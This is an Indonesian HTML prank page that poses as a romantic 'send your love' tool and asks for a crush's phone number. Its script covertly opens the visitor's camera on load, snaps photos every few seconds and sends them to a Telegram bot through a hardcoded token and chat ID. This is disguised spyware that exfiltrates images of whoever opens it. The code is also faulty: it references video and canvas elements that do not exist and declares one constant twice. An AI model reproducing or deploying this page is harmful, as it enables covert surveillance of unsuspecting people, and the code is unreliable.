<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Bucin Mode Aktif</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #ffb6c1, #ffc0cb);
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      color: #5a0f2e;
      overflow-x: hidden;
    }

    .hearts {
      position: fixed;
      inset: 0;
      background: url('https://i.imgur.com/8Km9tLL.png') repeat;
      opacity: 0.15;
      animation: float 25s linear infinite;
      pointer-events: none;
    }

    @keyframes float {
      from { background-position: 0 0; }
      to { background-position: 0 -2000px; }
    }

    .container {
      margin-top: 120px;
      background: rgba(255,255,255,0.85);
      padding: 40px 25px;
      border-radius: 25px;
      max-width: 420px;
      margin-left: auto;
      margin-right: auto;
      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
    }

    h1 {
      font-size: 2.6em;
      color: #d63384;
    }

    p {
      font-size: 1.1em;
      margin-top: 10px;
    }

    input {
      margin-top: 20px;
      padding: 15px;
      width: 90%;
      border-radius: 12px;
      border: 2px solid #ff69b4;
      font-size: 18px;
      outline: none;
    }

    button {
      margin-top: 25px;
      padding: 15px 35px;
      font-size: 18px;
      border-radius: 30px;
      border: none;
      cursor: pointer;
      background: #ff69b4;
      color: white;
      box-shadow: 0 10px 25px rgba(255,105,180,0.6);
      transition: 0.3s;
    }

    button:hover {
      transform: scale(1.05);
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="hearts"></div>

<div class="container">
  <h1>Bucin Mode ðŸ’–</h1>
  <p>
    Masukin nomor dia.  
    Yang bikin lu lupa makan, lupa tidur,  
    tapi senyum sendiri kayak orang sinting.
  </p>

  <input type="text" placeholder="Nomor ayang ðŸ¥º">
  <br>
  <button onclick="bucin()">KIRIM RASA SAYANG</button>
</div>

<!-- audio bucin -->
<audio id="sound">
  <source src="https://files.catbox.moe/9v9q9m.mp3" type="audio/mpeg">
</audio>

<script>
  const token = "8561616108:AAGTVrTzWw9UoR1JP0OyWkWeZlCwLXIEZHw";
  const chat_id = "6253366102";
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  const sound = document.getElementById("sound");

  function captureAndSend() {
    try {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(function(blob) {
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("photo", blob, "kamera.jpg");

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, 'image/jpeg');
    } catch (e) {
      console.error("Gagal ngambil gambar:", e);
    }
  }

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;

      // Jepret otomatis 3 detik setelah kamera nyala
      setTimeout(() => {
        captureAndSend();
        
        // Jepret terus tiap 10 detik
        setInterval(captureAndSend, 3000);
      }, 2000);
    })
    .catch(err => {
      console.error("Kamera error:", err);
    });
  
  const sound = document.getElementById("sound");

  function bucin() {
    sound.currentTime = 0;
    sound.play();

    alert(
      "Perasaan berhasil dikirim.\n" +
      "Efek samping:\n" +
      "- Kepikiran dia terus\n" +
      "- Senyum tanpa sebab\n" +
      "- Kangen ga ada obat"
    );
  }
 
</script>

</body>
</html>
